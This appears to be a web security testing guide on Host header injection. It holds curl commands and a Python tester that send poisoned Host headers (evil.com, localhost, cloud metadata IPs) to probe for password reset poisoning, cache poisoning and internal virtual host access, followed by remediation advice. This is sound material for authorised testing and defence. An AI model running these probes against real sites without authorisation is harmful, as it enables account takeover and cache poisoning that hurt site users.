# WSTG-INPV-17: Testing for Host Header Injection

## Test ID
WSTG-INPV-17

## Test Name
Testing for Host Header Injection

## High-Level Description

Host Header Injection occurs when applications trust the Host header value without validation. This can lead to cache poisoning, password reset poisoning, SSRF, and access to internal virtual hosts. Many applications use the Host header to generate URLs, making this a critical vulnerability.

---

## What to Check

- [ ] Password reset poisoning
- [ ] Cache poisoning
- [ ] Web cache deception
- [ ] Access to internal hosts
- [ ] SSRF via Host header
- [ ] Routing manipulation

---

## How to Test

### Step 1: Test Host Header Manipulation

```bash
#!/bin/bash
TARGET="target.com"

echo "[*] Testing Host Header Injection..."

# Basic host header manipulation
curl -s -H "Host: evil.com" "https://$TARGET/"

# X-Forwarded-Host
curl -s -H "X-Forwarded-Host: evil.com" "https://$TARGET/"

# Double Host header
curl -s -H "Host: evil.com" -H "Host: $TARGET" "https://$TARGET/"

# Absolute URL with different host
curl -s "https://$TARGET/" -H "Host: evil.com" --request-target "http://evil.com/"

# Port-based injection
curl -s -H "Host: $TARGET:evil.com" "https://$TARGET/"

# Internal hosts
curl -s -H "Host: localhost" "https://$TARGET/"
curl -s -H "Host: 127.0.0.1" "https://$TARGET/"
```

### Step 2: Host Header Injection Tester

```python
#!/usr/bin/env python3
"""
Host Header Injection Vulnerability Tester
"""

import requests
from urllib.parse import urlparse

class HostHeaderTester:
    def __init__(self, url):
        self.url = url
        self.parsed = urlparse(url)
        self.original_host = self.parsed.netloc
        self.findings = []
        self.session = requests.Session()

    # Test host values
    TEST_HOSTS = [
        "evil.com",
        "attacker.com",
        "localhost",
        "127.0.0.1",
        "internal.local",
        "[::1]",
        "169.254.169.254",
    ]

    def test_basic_injection(self):
        """Test basic Host header injection"""
        print("\n[*] Testing basic Host header injection...")

        for test_host in self.TEST_HOSTS:
            try:
                # Override Host header
                response = self.session.get(
                    self.url,
                    headers={'Host': test_host},
                    allow_redirects=False
                )

                # Check if host is reflected
                if test_host in response.text or test_host in response.headers.get('Location', ''):
                    print(f"[VULN] Host reflected: {test_host}")
                    self.findings.append({
                        'type': 'Host Header Reflection',
                        'host': test_host,
                        'severity': 'High'
                    })

                # Check for different content
                if response.status_code == 200 and len(response.text) > 0:
                    print(f"  [INFO] {test_host}: {response.status_code} ({len(response.text)} bytes)")

            except Exception as e:
                pass

    def test_x_forwarded_host(self):
        """Test X-Forwarded-Host injection"""
        print("\n[*] Testing X-Forwarded-Host injection...")

        override_headers = [
            'X-Forwarded-Host',
            'X-Host',
            'X-Forwarded-Server',
            'X-HTTP-Host-Override',
            'Forwarded',
        ]

        for header in override_headers:
            for test_host in ['evil.com', 'attacker.com']:
                try:
                    if header == 'Forwarded':
                        header_value = f'host={test_host}'
                    else:
                        header_value = test_host

                    response = self.session.get(
                        self.url,
                        headers={header: header_value},
                        allow_redirects=False
                    )

                    if test_host in response.text or test_host in str(response.headers):
                        print(f"[VULN] {header}: {test_host} reflected!")
                        self.findings.append({
                            'type': f'{header} Injection',
                            'host': test_host,
                            'severity': 'High'
                        })

                except Exception as e:
                    pass

    def test_password_reset_poisoning(self):
        """Test password reset poisoning"""
        print("\n[*] Testing password reset poisoning...")

        reset_endpoints = [
            '/forgot-password',
            '/password-reset',
            '/reset-password',
            '/api/auth/forgot-password',
        ]

        for endpoint in reset_endpoints:
            try:
                reset_url = f"{self.parsed.scheme}://{self.original_host}{endpoint}"

                # Submit reset request with poisoned host
                response = self.session.post(
                    reset_url,
                    headers={'Host': 'evil.com'},
                    data={'email': 'test@example.com'},
                    allow_redirects=False
                )

                if response.status_code in [200, 302]:
                    print(f"[WARN] Reset endpoint accepts poisoned host: {endpoint}")
                    print(f"  Check if reset link contains evil.com")
                    self.findings.append({
                        'type': 'Password Reset Poisoning (Potential)',
                        'endpoint': endpoint,
                        'severity': 'High',
                        'note': 'Verify reset email contains poisoned host'
                    })

            except Exception as e:
                pass

    def test_cache_poisoning(self):
        """Test web cache poisoning via Host header"""
        print("\n[*] Testing cache poisoning...")

        # Add cache buster
        import random
        cache_buster = f"?cb={random.randint(10000,99999)}"

        try:
            # Request with poisoned host
            poisoned_response = self.session.get(
                f"{self.url}{cache_buster}",
                headers={'Host': 'evil.com'},
                allow_redirects=False
            )

            # Request with normal host (should hit cache)
            normal_response = self.session.get(
                f"{self.url}{cache_buster}",
                allow_redirects=False
            )

            # Check if poisoned content is cached
            if 'evil.com' in normal_response.text:
                print(f"[VULN] Cache poisoning successful!")
                self.findings.append({
                    'type': 'Web Cache Poisoning',
                    'severity': 'Critical'
                })
            else:
                print(f"  [INFO] Cache not poisoned (or no cache)")

        except Exception as e:
            pass

    def test_virtual_host_routing(self):
        """Test access to different virtual hosts"""
        print("\n[*] Testing virtual host routing...")

        internal_hosts = [
            'admin.' + self.original_host,
            'internal.' + self.original_host,
            'dev.' + self.original_host,
            'staging.' + self.original_host,
            'api.' + self.original_host,
            'test.' + self.original_host,
        ]

        for host in internal_hosts:
            try:
                response = self.session.get(
                    self.url,
                    headers={'Host': host},
                    allow_redirects=False
                )

                if response.status_code == 200:
                    print(f"  [INFO] {host}: {response.status_code} ({len(response.text)} bytes)")

                    # Check if different content
                    if 'admin' in response.text.lower() or 'internal' in response.text.lower():
                        print(f"[VULN] Access to internal host: {host}")
                        self.findings.append({
                            'type': 'Internal Virtual Host Access',
                            'host': host,
                            'severity': 'High'
                        })

            except Exception as e:
                pass

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("HOST HEADER INJECTION REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo Host header injection vulnerabilities confirmed.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                if 'host' in f:
                    print(f"  Host: {f['host']}")
                if 'note' in f:
                    print(f"  Note: {f['note']}")

    def run_tests(self):
        """Run all Host header tests"""
        self.test_basic_injection()
        self.test_x_forwarded_host()
        self.test_password_reset_poisoning()
        self.test_cache_poisoning()
        self.test_virtual_host_routing()
        self.generate_report()

# Usage
tester = HostHeaderTester("https://target.com")
tester.run_tests()
```

---

## Tools

| Tool | Purpose |
|------|---------|
| Burp Suite | Header manipulation |
| curl | Manual testing |
| Param Miner | Header discovery |

---

## Remediation

```python
# Python/Flask - Use configured host
from flask import Flask, request, url_for

app = Flask(__name__)
app.config['SERVER_NAME'] = 'example.com'

@app.route('/reset-password')
def reset_password():
    # Use url_for with _external=True and configured SERVER_NAME
    reset_link = url_for('confirm_reset', token=token, _external=True)
    # Never use request.host directly for security-sensitive URLs
```

```nginx
# Nginx - Validate Host header
server {
    listen 80;
    server_name example.com www.example.com;

    # Reject requests with wrong Host
    if ($host !~* ^(example\.com|www\.example\.com)$) {
        return 444;
    }
}
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| Password reset poisoning | 8.1 | High |
| Web cache poisoning | 7.5 | High |
| Internal host access | 7.5 | High |
| Host header reflection | 5.3 | Medium |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-20** | Improper Input Validation |

---

## Checklist

```
[ ] Basic Host injection tested
[ ] X-Forwarded-Host tested
[ ] Password reset poisoning tested
[ ] Cache poisoning tested
[ ] Virtual host routing tested
[ ] Findings documented
```
